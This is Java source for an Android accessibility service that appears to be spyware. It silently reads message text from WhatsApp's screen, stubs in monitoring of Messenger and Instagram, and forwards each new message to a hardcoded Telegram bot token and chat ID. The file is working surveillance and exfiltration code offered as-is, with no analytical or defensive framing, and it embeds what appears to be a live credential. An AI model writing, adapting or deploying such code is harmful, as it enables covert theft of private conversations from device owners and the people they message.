package com.alzahra.services;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import com.alzahra.telegram.TelegramBot;

import java.util.List;

public class WhatsAppAccessibilityService extends AccessibilityService {

    private static final String TAG = "Accessibility";
    private TelegramBot bot;
    private String lastMessage = "";

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        AccessibilityServiceInfo info = new AccessibilityServiceInfo();
        info.eventTypes = AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED |
                AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED |
                AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED;
        info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
        info.notificationTimeout = 100;
        setServiceInfo(info);

        bot = new TelegramBot("8353955949:AAHAl3ELWn8m-tucuf5ZktLZfTAT5G1v1gA");
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        try {
            String packageName = event.getPackageName().toString();
            AccessibilityNodeInfo rootNode = getRootInActiveWindow();
            if (rootNode == null) return;

            // Monitor WhatsApp
            if (packageName.contains("whatsapp")) {
                extractWhatsAppMessages(rootNode);
            }

            // Monitor other apps
            if (packageName.contains("messenger") || packageName.contains("instagram")) {
                // Extract messages from other apps
            }

            rootNode.recycle();

        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private void extractWhatsAppMessages(AccessibilityNodeInfo root) {
        try {
            // Find message containers
            List<AccessibilityNodeInfo> messages = root.findAccessibilityNodeInfosByViewId("com.whatsapp:id/message_text");
            if (messages == null) return;

            for (AccessibilityNodeInfo msg : messages) {
                if (msg.getText() != null) {
                    String text = msg.getText().toString();
                    if (!text.equals(lastMessage) && !text.isEmpty()) {
                        lastMessage = text;
                        // Send to Telegram bot
                        bot.sendMessage("7344776596", "📱 WhatsApp: " + text.substring(0, Math.min(text.length(), 500)));
                    }
                }
            }
        } catch (Exception e) {}
    }

    @Override
    public void onInterrupt() {}

    @Override
    public void onDestroy() {
        super.onDestroy();
    }
}
 JAVA



